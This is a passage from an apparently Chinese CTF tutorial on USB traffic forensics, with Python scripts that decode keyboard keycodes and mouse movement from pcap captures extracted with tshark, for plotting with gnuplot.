aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本二：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">normalKeys <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"04"</span><span class="token punctuation">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span> <span class="token string">"e"</span><span class="token punctuation">,</span>    <span class="token string">"09"</span><span class="token punctuation">:</span> <span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span> <span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span> <span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span> <span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span> <span class="token string">"j"</span><span class="token punctuation">,</span>    <span class="token string">"0e"</span><span class="token punctuation">:</span> <span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span> <span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span> <span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span> <span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span> <span class="token string">"o"</span><span class="token punctuation">,</span>    <span class="token string">"13"</span><span class="token punctuation">:</span> <span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span> <span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span> <span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span> <span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span> <span class="token string">"t"</span><span class="token punctuation">,</span>    <span class="token string">"18"</span><span class="token punctuation">:</span> <span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span> <span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span> <span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span> <span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span> <span class="token string">"y"</span><span class="token punctuation">,</span>    <span class="token string">"1d"</span><span class="token punctuation">:</span> <span class="token string">"z"</span><span class="token punctuation">,</span> <span class="token string">"1e"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span>    <span class="token string">"22"</span><span class="token punctuation">:</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span> <span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token string">"24"</span><span class="token punctuation">:</span> <span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token string">"25"</span><span class="token punctuation">:</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token string">"26"</span><span class="token punctuation">:</span> <span class="token string">"9"</span><span class="token punctuation">,</span>    <span class="token string">"27"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token string">"28"</span><span class="token punctuation">:</span> <span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">:</span> <span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span> <span class="token string">"2a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span> <span class="token string">"\t"</span><span class="token punctuation">,</span>    <span class="token string">"2c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span> <span class="token string">"2d"</span><span class="token punctuation">:</span> <span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">"2e"</span><span class="token punctuation">:</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">"2f"</span><span class="token punctuation">:</span> <span class="token string">"["</span><span class="token punctuation">,</span> <span class="token string">"30"</span><span class="token punctuation">:</span> <span class="token string">"]"</span><span class="token punctuation">,</span> <span class="token string">"31"</span><span class="token punctuation">:</span> <span class="token string">"\\"</span><span class="token punctuation">,</span>    <span class="token string">"32"</span><span class="token punctuation">:</span> <span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span> <span class="token string">"33"</span><span class="token punctuation">:</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token string">"34"</span><span class="token punctuation">:</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"35"</span><span class="token punctuation">:</span> <span class="token string">"&lt;GA>"</span><span class="token punctuation">,</span> <span class="token string">"36"</span><span class="token punctuation">:</span> <span class="token string">","</span><span class="token punctuation">,</span> <span class="token string">"37"</span><span class="token punctuation">:</span> <span class="token string">"."</span><span class="token punctuation">,</span>    <span class="token string">"38"</span><span class="token punctuation">:</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"39"</span><span class="token punctuation">:</span> <span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span> <span class="token string">"3a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span> <span class="token string">"3b"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span> <span class="token string">"3d"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span>    <span class="token string">"3e"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span> <span class="token string">"3f"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span> <span class="token string">"40"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span> <span class="token string">"41"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span> <span class="token string">"42"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span> <span class="token string">"43"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span>    <span class="token string">"44"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span> <span class="token string">"45"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F12>"</span><span class="token punctuation">&#125;</span>shiftKeys <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"04"</span><span class="token punctuation">:</span> <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span> <span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span> <span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span> <span class="token string">"E"</span><span class="token punctuation">,</span>    <span class="token string">"09"</span><span class="token punctuation">:</span> <span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span> <span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span> <span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span> <span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span> <span class="token string">"J"</span><span class="token punctuation">,</span>    <span class="token string">"0e"</span><span class="token punctuation">:</span> <span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span> <span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span> <span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span> <span class="token string">"O"</span><span class="token punctuation">,</span>    <span class="token string">"13"</span><span class="token punctuation">:</span> <span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span> <span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span> <span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span> <span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span> <span class="token string">"T"</span><span class="token punctuation">,</span>    <span class="token string">"18"</span><span class="token punctuation">:</span> <span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span> <span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span> <span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span> <span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span> <span class="token string">"Y"</span><span class="token punctuation">,</span>    <span class="token string">"1d"</span><span class="token punctuation">:</span> <span class="token string">"Z"</span><span class="token punctuation">,</span> <span class="token string">"1e"</span><span class="token punctuation">:</span> <span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span> <span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span> <span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span> <span class="token string">"$"</span><span class="token punctuation">,</span>    <span class="token string">"22"</span><span class="token punctuation">:</span> <span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span> <span class="token string">"^"</span><span class="token punctuation">,</span> <span class="token string">"24"</span><span class="token punctuation">:</span> <span class="token string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string">"25"</span><span class="token punctuation">:</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"26"</span><span class="token punctuation">:</span> <span class="token string">"("</span><span class="token punctuation">,</span> <span class="token string">"27"</span><span class="token punctuation">:</span> <span class="token string">")"</span><span class="token punctuation">,</span>    <span class="token string">"28"</span><span class="token punctuation">:</span> <span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">:</span> <span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span> <span class="token string">"2a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span> <span class="token string">"\t"</span><span class="token punctuation">,</span> <span class="token string">"2c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span>    <span class="token string">"2d"</span><span class="token punctuation">:</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">"2e"</span><span class="token punctuation">:</span> <span class="token string">"+"</span><span class="token punctuation">,</span> <span class="token string">"2f"</span><span class="token punctuation">:</span> <span class="token string">"&#123;"</span><span class="token punctuation">,</span> <span class="token string">"30"</span><span class="token punctuation">:</span> <span class="token string">"&#125;"</span><span class="token punctuation">,</span> <span class="token string">"31"</span><span class="token punctuation">:</span> <span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token string">"32"</span><span class="token punctuation">:</span> <span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span> <span class="token string">"33"</span><span class="token punctuation">:</span> <span class="token string">"\""</span><span class="token punctuation">,</span>    <span class="token string">"34"</span><span class="token punctuation">:</span> <span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"35"</span><span class="token punctuation">:</span> <span class="token string">"&lt;GA>"</span><span class="token punctuation">,</span> <span class="token string">"36"</span><span class="token punctuation">:</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"37"</span><span class="token punctuation">:</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"38"</span><span class="token punctuation">:</span> <span class="token string">"?"</span><span class="token punctuation">,</span> <span class="token string">"39"</span><span class="token punctuation">:</span> <span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span> <span class="token string">"3a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span>    <span class="token string">"3b"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span> <span class="token string">"3d"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span> <span class="token string">"3e"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span> <span class="token string">"3f"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span> <span class="token string">"40"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span>    <span class="token string">"41"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span> <span class="token string">"42"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span> <span class="token string">"43"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span> <span class="token string">"44"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span> <span class="token string">"45"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F12>"</span><span class="token punctuation">&#125;</span>output <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>keys <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">and</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'2'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span>            <span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> \                line<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"00"</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token keyword">in</span> normalKeys<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            output <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>normalKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>shiftKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            output <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'[unknown]'</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>keys<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> output<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'&lt;DEL>'</span><span class="token punctuation">)</span>        <span class="token keyword">del</span> output<span class="token punctuation">[</span>a<span class="token punctuation">]</span>        <span class="token keyword">del</span> output<span class="token punctuation">[</span>a <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> output<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"&lt;CAP>"</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token number">1</span>            output<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>                flag <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            output<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'output :'</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h2><blockquote><p><strong>鼠标流量的数据长度为 4 个字节</strong>，集中在 <code>Leftover Capture Data</code> 域的第 3 个字节中</p><ol><li>第 1 个字节代表按键，当取 0x00 时，代表没有按键；为 0x01 时，代表按左键，为 0x02 时，代表按右键</li><li>第 2 个字节可以看成是一个 signed byte 类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素</li><li>第 3 个字节与第 2 字节类似，代表垂直上下移动多少像素</li></ol></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%9011.png" alt="CTF-Misc_流量分析11.png"></p><p>与键盘流量类似，首先使用 <code>tshark</code> 提取鼠标数据：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tshark <span class="token parameter variable">-r</span> usb2.pcap <span class="token parameter variable">-T</span> fields <span class="token parameter variable">-e</span> usb.capdata <span class="token operator">></span> usbdata.txttshark <span class="token parameter variable">-r</span> usb2.pcap <span class="token parameter variable">-T</span> fields <span class="token parameter variable">-e</span> usb.capdata <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'/^\s*$/d'</span> <span class="token operator">></span> usbdata.txt <span class="token comment">#提取并去除空行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果提取出来的数据没有加冒号，使用脚本添加：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'usbdata.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>fi <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> a<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span> <span class="token comment"># 如果是键盘流量 len 改为 16</span>            out <span class="token operator">=</span> <span class="token string">''</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> i <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>                    out <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">":"</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    out <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>            fi<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span>            fi<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>fi<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试信息隐藏位置，根据脚本中 <code>btn_flag</code> 取何值时能得到一系列坐标来判断信息隐藏在鼠标左键还是右键中：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>keys <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'xy.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>posx <span class="token operator">=</span> <span class="token number">0</span>posy <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">12</span> <span class="token punctuation">:</span>        <span class="token keyword">continue</span>    x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    y <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> x <span class="token operator">></span> <span class="token number">127</span> <span class="token punctuation">:</span>        x <span class="token operator">-=</span> <span class="token number">256</span>    <span class="token keyword">if</span> y <span class="token operator">></span> <span class="token number">127</span> <span class="token punctuation">:</span>        y <span class="token operator">-=</span> <span class="token number">256</span>    posx <span class="token operator">+=</span> x    posy <span class="token operator">+=</span> y    btn_flag <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 1 for left , 2 for right , 0 for nothing</span>    <span class="token keyword">if</span> btn_flag <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">:</span> <span class="token comment"># 1 代表左键</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>posx<span class="token punctuation">)</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>posy<span class="token punctuation">)</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 <code>gnuplot</code> 将 